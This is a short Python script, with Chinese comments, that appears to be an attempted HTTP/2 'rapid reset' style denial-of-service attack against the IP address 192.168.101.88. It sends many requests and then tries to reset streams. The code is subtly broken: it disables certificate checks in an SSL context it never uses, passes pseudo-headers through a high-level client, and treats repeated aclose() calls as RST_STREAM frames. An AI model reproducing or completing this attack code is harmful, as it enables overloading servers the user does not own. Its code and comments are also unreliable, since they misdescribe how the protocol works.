import httpx
import asyncio
import ssl

# 禁用SSL证书验证
ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

async def send_http2_requests(url, num_requests):
    async with httpx.AsyncClient(http2=True) as client:
        # 打包并发送多个HEADERS帧
        for i in range(num_requests):
            headers = {':method': 'GET', ':path': f'/request{i}'}
            await client.get(url, headers=headers)

        # 打包并发送多个RST_STREAM帧
        for i in range(num_requests):
            await client.aclose()

def main():
    url = 'https://192.168.101.88:443'
    num_requests = 10  # 设置要发送的请求数量
    asyncio.run(send_http2_requests(url, num_requests))

if __name__ == '__main__':
    main()